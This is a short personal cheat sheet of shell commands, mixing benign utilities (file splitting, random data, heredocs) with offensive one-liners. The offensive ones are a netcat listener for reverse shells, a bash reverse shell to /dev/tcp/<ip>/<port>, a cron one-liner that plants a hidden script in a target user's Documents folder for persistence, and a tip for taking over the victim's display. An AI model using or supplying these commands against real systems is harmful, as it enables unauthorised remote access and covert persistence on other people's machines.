## Commands
This is my quick list of commands

* Gives a quick help guide to commands
`curl cheat.sh/<command>`

* Using netcat, listen on a port for reverse shell
`nc -nlvp <port>`

* Set a cronjob using one liner
`{ crontab -l; echo "*/1 * * * * /home/$target/Documents/.lolgotem/remote.sh"; } | crontab -`

* Reverse bash shell
`bash -i >& /dev/tcp/<ip>/<port> 0>&1`

* when reverse shell, control display
`export DISPLAY=:0.0`

* Insert typed text until flag is given. In this case, ZZ is used
`cat << ZZ > input.txt`

* Fill a file with random junk
`base64 /dev/urandom | head -c <# of bytes> > file.txt`

* Split large file into chunks
`split -b 9999k file.txt part.`

* To recombine
`cat part.?? > recombine.txt
